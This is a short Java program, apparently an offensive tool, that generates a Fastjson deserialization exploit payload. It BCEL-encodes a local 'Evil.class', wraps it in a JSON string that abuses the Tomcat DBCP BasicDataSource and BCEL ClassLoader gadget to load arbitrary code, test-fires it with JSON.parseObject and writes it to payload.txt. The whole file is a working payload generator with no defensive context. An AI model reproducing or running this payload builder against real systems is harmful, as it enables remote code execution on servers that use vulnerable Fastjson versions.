import com.sun.org.apache.bcel.internal.classfile.Utility;
import org.springframework.util.FileCopyUtils;
import com.alibaba.fastjson.JSON;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.IOException;
import java.io.BufferedWriter;
import java.io.FileWriter;


public class fastjsonBcel {
    public static void main(String[] args) throws Exception {
      //  if (args.length == 0) {
     //      System.out.println("未提供命令行参数。");
          //  System.out.println("参数: " + "url jndi");
        //} else {
            byte[] bytes = fileToBinArray(new File("d:\\Evil.class"));
            String code = Utility.encode(bytes, true);
            String s = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassName\":\"$$BCEL$$" + code + "\",\"driverClassloader\": {\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";
            JSON.parseObject(s);
            System.out.println(s);
            String filePath = "payload.txt";

            // 调用写入文件的方法
            writeStringToFile(s, filePath);

            System.out.println("PayLoad成功写入文件: " + filePath);
        }
  //  }
    // 将文件转为字节码数组
    public static byte[] fileToBinArray(File file) {
        try {
            InputStream fis = new FileInputStream(file);
            byte[] bytes = FileCopyUtils.copyToByteArray(fis);
            return bytes;
        } catch (Exception ex) {
            throw new RuntimeException("transform file into bin Array 出错", ex);
        }
    }

    private static void writeStringToFile(String content, String filePath) {
        BufferedWriter writer = null;

        try {
            // 创建 FileWriter 对象，第二个参数表示是否追加内容
            writer = new BufferedWriter(new FileWriter(filePath));

            // 写入内容
            writer.write(content);
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                // 关闭 BufferedWriter
                if (writer != null) {
                    writer.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
